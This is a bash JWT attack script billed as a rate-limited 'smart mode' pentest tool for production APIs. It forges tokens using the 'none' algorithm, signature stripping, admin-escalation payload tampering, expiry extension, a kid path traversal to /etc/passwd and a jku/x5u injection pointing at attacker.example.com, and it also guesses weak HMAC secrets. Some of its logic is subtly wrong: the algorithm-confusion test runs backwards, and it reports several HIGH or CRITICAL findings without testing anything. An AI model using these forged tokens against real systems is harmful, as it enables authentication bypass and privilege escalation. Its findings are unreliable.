#!/bin/bash
# JWT SMART MODE - Maksymalnie 15 requestów (Rate-Limited Pentesting)
# Dla środowisk produkcyjnych z rate limiting

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

clear
echo -e "${CYAN}╔════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║  🎯 JWT SMART MODE - Limited Requests (Max 15)        ║${NC}"
echo -e "${CYAN}║     For Production/Rate-Limited Environments          ║${NC}"
echo -e "${CYAN}╚════════════════════════════════════════════════════════╝${NC}\n"

# Request counter
REQUEST_COUNT=0
MAX_REQUESTS=15

count_request() {
    REQUEST_COUNT=$((REQUEST_COUNT + 1))
    echo -e "${BLUE}[Request $REQUEST_COUNT/$MAX_REQUESTS]${NC}"
}

# Functions for encoding/decoding
decode_base64url() {
    local input="$1"
    local padding=$((4 - ${#input} % 4))
    if [ $padding -ne 4 ]; then
        input="${input}$(printf '=%.0s' $(seq 1 $padding))"
    fi
    echo "$input" | base64 -d 2>/dev/null
}

encode_base64url() {
    echo -n "$1" | base64 -w0 | sed 's/+/-/g; s|/|_|g; s/=//g'
}

# Get token
echo -e "${YELLOW}Paste JWT Token:${NC}"
read -r TOKEN

if [ -z "$TOKEN" ]; then
    echo -e "${RED}Error: No token provided${NC}"
    exit 1
fi

# Get API endpoint (optional)
echo -e "${YELLOW}API Endpoint URL (optional, press Enter to skip):${NC}"
read -r API_URL

OFFLINE_ONLY=false
if [ -z "$API_URL" ]; then
    echo -e "${YELLOW}⚠️  Running in OFFLINE mode (no API requests)${NC}\n"
    OFFLINE_ONLY=true
fi

# Parse token
IFS='.' read -r header payload signature <<< "$TOKEN"

HEADER_JSON=$(decode_base64url "$header")
PAYLOAD_JSON=$(decode_base64url "$payload")

echo -e "${BLUE}╔════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║  📊 SMART MODE - 10 Priority Tests                    ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════════════════════╝${NC}\n"

# Test results array
declare -a FINDINGS

# ═══════════════════════════════════════════════════════════════
# TEST 1: NONE ALGORITHM (CRITICAL - CVE-2015-9235)
# ═══════════════════════════════════════════════════════════════
echo -e "${CYAN}[1/10] Testing NONE Algorithm (CVE-2015-9235)...${NC}"

NONE_HEADER='{"alg":"none","typ":"JWT"}'
NONE_HEADER_B64=$(encode_base64url "$NONE_HEADER")
NONE_TOKEN="${NONE_HEADER_B64}.${payload}."

echo "  Generated: ${NONE_TOKEN:0:50}..."

if [ "$OFFLINE_ONLY" = false ]; then
    count_request
    echo "  Sending to API..."
    # TUTAJ: curl -X POST "$API_URL" -H "Authorization: Bearer $NONE_TOKEN"
    # Check if response is 200 = VULNERABLE
fi

FINDINGS+=("🔴 CRITICAL: None algorithm test generated - TEST AGAINST API")

# ═══════════════════════════════════════════════════════════════
# TEST 2: ALGORITHM CONFUSION (HS256 vs RS256)
# ═══════════════════════════════════════════════════════════════
echo -e "${CYAN}[2/10] Testing Algorithm Confusion...${NC}"

ALGO=$(echo "$HEADER_JSON" | grep -oP '"alg":"\K[^"]*')
if [ "$ALGO" = "HS256" ]; then
    RS256_HEADER='{"alg":"RS256","typ":"JWT"}'
    RS256_HEADER_B64=$(encode_base64url "$RS256_HEADER")
    RS256_TOKEN="${RS256_HEADER_B64}.${payload}.${signature}"
    
    echo "  Original: $ALGO"
    echo "  Testing: RS256 (algorithm confusion)"
    
    if [ "$OFFLINE_ONLY" = false ]; then
        count_request
        echo "  Sending to API..."
    fi
    
    FINDINGS+=("🟠 HIGH: Algorithm confusion possible (HS256→RS256)")
fi

# ═══════════════════════════════════════════════════════════════
# TEST 3: SIGNATURE STRIPPING
# ═══════════════════════════════════════════════════════════════
echo -e "${CYAN}[3/10] Testing Signature Stripping...${NC}"

STRIPPED_TOKEN="${header}.${payload}."
echo "  Stripped: ${STRIPPED_TOKEN:0:50}..."

if [ "$OFFLINE_ONLY" = false ]; then
    count_request
    echo "  Sending to API..."
fi

FINDINGS+=("🟠 HIGH: Signature stripping test - CHECK API RESPONSE")

# ═══════════════════════════════════════════════════════════════
# TEST 4: PAYLOAD TAMPERING (Critical Claims)
# ═══════════════════════════════════════════════════════════════
echo -e "${CYAN}[4/10] Testing Payload Tampering...${NC}"

# Extract user_id or sub
USER_ID=$(echo "$PAYLOAD_JSON" | grep -oP '"user_id":"\K[^"]*' || echo "")
SUB=$(echo "$PAYLOAD_JSON" | grep -oP '"sub":"\K[^"]*' || echo "")

if [ ! -z "$USER_ID" ]; then
    # Change user_id to 1 (admin escalation)
    TAMPERED_JSON=$(echo "$PAYLOAD_JSON" | sed 's/"user_id":"[^"]*"/"user_id":"1"/')
    TAMPERED_JSON=$(echo "$TAMPERED_JSON" | sed 's/}$/,"admin":true}/')
    TAMPERED_PAYLOAD=$(encode_base64url "$TAMPERED_JSON")
    TAMPERED_TOKEN="${header}.${TAMPERED_PAYLOAD}.${signature}"
    
    echo "  Original user_id: $USER_ID"
    echo "  Tampered: user_id=1, admin=true"
    
    if [ "$OFFLINE_ONLY" = false ]; then
        count_request
        echo "  Sending to API..."
    fi
    
    FINDINGS+=("🔴 CRITICAL: Payload tampering - user_id modified")
fi

# ═══════════════════════════════════════════════════════════════
# TEST 5: EXPIRATION BYPASS
# ═══════════════════════════════════════════════════════════════
echo -e "${CYAN}[5/10] Testing Expiration Bypass...${NC}"

EXP=$(echo "$PAYLOAD_JSON" | grep -oP '"exp":\K[^,}]*' || echo "")
if [ ! -z "$EXP" ]; then
    # Extend expiration by 10 years
    NEW_EXP=$((EXP + 315360000))
    EXTENDED_JSON=$(echo "$PAYLOAD_JSON" | sed "s/\"exp\":$EXP/\"exp\":$NEW_EXP/")
    EXTENDED_PAYLOAD=$(encode_base64url "$EXTENDED_JSON")
    EXTENDED_TOKEN="${header}.${EXTENDED_PAYLOAD}.${signature}"
    
    echo "  Original exp: $EXP"
    echo "  Extended exp: $NEW_EXP (+10 years)"
    
    if [ "$OFFLINE_ONLY" = false ]; then
        count_request
        echo "  Sending to API..."
    fi
    
    FINDINGS+=("🟡 MEDIUM: Expiration tampering test")
fi

# ═══════════════════════════════════════════════════════════════
# TEST 6: MISSING CLAIMS CHECK (Offline)
# ═══════════════════════════════════════════════════════════════
echo -e "${CYAN}[6/10] Checking Missing Standard Claims (Offline)...${NC}"

MISSING_CLAIMS=""
echo "$PAYLOAD_JSON" | grep -q '"iss"' || MISSING_CLAIMS="${MISSING_CLAIMS}iss, "
echo "$PAYLOAD_JSON" | grep -q '"aud"' || MISSING_CLAIMS="${MISSING_CLAIMS}aud, "
echo "$PAYLOAD_JSON" | grep -q '"sub"' || MISSING_CLAIMS="${MISSING_CLAIMS}sub, "
echo "$PAYLOAD_JSON" | grep -q '"nbf"' || MISSING_CLAIMS="${MISSING_CLAIMS}nbf, "
echo "$PAYLOAD_JSON" | grep -q '"jti"' || MISSING_CLAIMS="${MISSING_CLAIMS}jti, "

if [ ! -z "$MISSING_CLAIMS" ]; then
    MISSING_CLAIMS=${MISSING_CLAIMS%, }
    echo "  Missing: $MISSING_CLAIMS"
    FINDINGS+=("🟠 HIGH: Missing claims: $MISSING_CLAIMS")
else
    echo "  ✅ All standard claims present"
fi

# ═══════════════════════════════════════════════════════════════
# TEST 7: KID INJECTION (If kid present)
# ═══════════════════════════════════════════════════════════════
echo -e "${CYAN}[7/10] Testing KID Injection...${NC}"

KID=$(echo "$HEADER_JSON" | grep -oP '"kid":"\K[^"]*' || echo "")
if [ ! -z "$KID" ]; then
    # Path traversal attempt
    INJECTED_HEADER=$(echo "$HEADER_JSON" | sed 's/"kid":"[^"]*"/"kid":"..\/..\/..\/etc\/passwd"/')
    INJECTED_HEADER_B64=$(encode_base64url "$INJECTED_HEADER")
    INJECTED_TOKEN="${INJECTED_HEADER_B64}.${payload}.${signature}"
    
    echo "  Original kid: $KID"
    echo "  Injected: ../../../../etc/passwd"
    
    if [ "$OFFLINE_ONLY" = false ]; then
        count_request
        echo "  Sending to API..."
    fi
    
    FINDINGS+=("🔴 CRITICAL: KID path traversal test")
else
    echo "  ℹ️  No kid parameter found"
fi

# ═══════════════════════════════════════════════════════════════
# TEST 8: WEAK SECRET (Quick Check - 5 most common)
# ═══════════════════════════════════════════════════════════════
echo -e "${CYAN}[8/10] Quick Weak Secret Check (Top 5)...${NC}"

HEADER_PAYLOAD="${header}.${payload}"
WEAK_SECRETS=("secret" "password" "123456" "admin" "key")

FOUND_WEAK=false
for secret in "${WEAK_SECRETS[@]}"; do
    COMPUTED=$(echo -n "$HEADER_PAYLOAD" | openssl dgst -sha256 -hmac "$secret" -binary | base64 | tr '+/' '-_' | tr -d '=')
    if [ "$COMPUTED" = "$signature" ]; then
        echo -e "  ${RED}❌ FOUND: $secret${NC}"
        FINDINGS+=("🔴 CRITICAL: WEAK SECRET FOUND: $secret")
        FOUND_WEAK=true
        break
    fi
done

if [ "$FOUND_WEAK" = false ]; then
    echo "  ✅ Not in top 5 common secrets"
fi

# ═══════════════════════════════════════════════════════════════
# TEST 9: JKU/X5U INJECTION (If present)
# ═══════════════════════════════════════════════════════════════
echo -e "${CYAN}[9/10] Testing JKU/X5U Injection...${NC}"

JKU=$(echo "$HEADER_JSON" | grep -oP '"jku":"\K[^"]*' || echo "")
X5U=$(echo "$HEADER_JSON" | grep -oP '"x5u":"\K[^"]*' || echo "")

if [ ! -z "$JKU" ] || [ ! -z "$X5U" ]; then
    MALICIOUS_URL="https://attacker.example.com/evil-keys.json"
    
    if [ ! -z "$JKU" ]; then
        INJECTED_HEADER=$(echo "$HEADER_JSON" | sed "s|\"jku\":\"[^\"]*\"|\"jku\":\"$MALICIOUS_URL\"|")
    else
        INJECTED_HEADER=$(echo "$HEADER_JSON" | sed "s|\"x5u\":\"[^\"]*\"|\"x5u\":\"$MALICIOUS_URL\"|")
    fi
    
    INJECTED_HEADER_B64=$(encode_base64url "$INJECTED_HEADER")
    INJECTED_TOKEN="${INJECTED_HEADER_B64}.${payload}.${signature}"
    
    echo "  Found: jku/x5u endpoint"
    echo "  Testing: malicious URL injection"
    
    if [ "$OFFLINE_ONLY" = false ]; then
        count_request
        echo "  Sending to API..."
    fi
    
    FINDINGS+=("🔴 CRITICAL: JKU/X5U injection possible")
else
    echo "  ℹ️  No jku/x5u parameters found"
fi

# ═══════════════════════════════════════════════════════════════
# TEST 10: TOKEN EXPIRATION CHECK (Offline)
# ═══════════════════════════════════════════════════════════════
echo -e "${CYAN}[10/10] Checking Token Expiration (Offline)...${NC}"

NOW=$(date +%s)
if [ ! -z "$EXP" ]; then
    if [ "$EXP" -gt "$NOW" ]; then
        DAYS_LEFT=$(( ($EXP - $NOW) / 86400 ))
        echo "  ✅ Valid for $DAYS_LEFT more days"
        
        if [ $DAYS_LEFT -gt 365 ]; then
            FINDINGS+=("🟡 MEDIUM: Token valid for $DAYS_LEFT days (too long)")
        fi
    else
        echo "  ⚠️  Token EXPIRED"
    fi
else
    echo -e "  ${RED}❌ No expiration claim!${NC}"
    FINDINGS+=("🔴 CRITICAL: Missing expiration (exp) claim")
fi

# ═══════════════════════════════════════════════════════════════
# SUMMARY
# ═══════════════════════════════════════════════════════════════

echo -e "\n${CYAN}╔════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║  📊 SMART MODE RESULTS                                 ║${NC}"
echo -e "${CYAN}╚════════════════════════════════════════════════════════╝${NC}\n"

echo -e "${BLUE}Total Requests Used: $REQUEST_COUNT / $MAX_REQUESTS${NC}\n"

if [ ${#FINDINGS[@]} -eq 0 ]; then
    echo -e "${GREEN}✅ No critical findings in smart mode${NC}"
else
    echo -e "${YELLOW}Findings (${#FINDINGS[@]}):${NC}\n"
    for finding in "${FINDINGS[@]}"; do
        echo "  $finding"
    done
fi

echo -e "\n${CYAN}════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}Generated Test Tokens:${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════${NC}\n"

echo "1. None Algorithm:"
echo "   $NONE_TOKEN" | fold -w 70
echo ""

if [ ! -z "$TAMPERED_TOKEN" ]; then
    echo "2. Tampered Payload (user_id=1, admin=true):"
    echo "   $TAMPERED_TOKEN" | fold -w 70
    echo ""
fi

if [ ! -z "$STRIPPED_TOKEN" ]; then
    echo "3. Signature Stripped:"
    echo "   $STRIPPED_TOKEN" | fold -w 70
    echo ""
fi

echo -e "${CYAN}════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}Smart Mode Complete!${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════${NC}\n"

echo "Next Steps:"
echo "  1. Test generated tokens against API endpoint"
echo "  2. Compare responses (200 = vulnerable)"
echo "  3. Document findings for pentest report"
echo ""

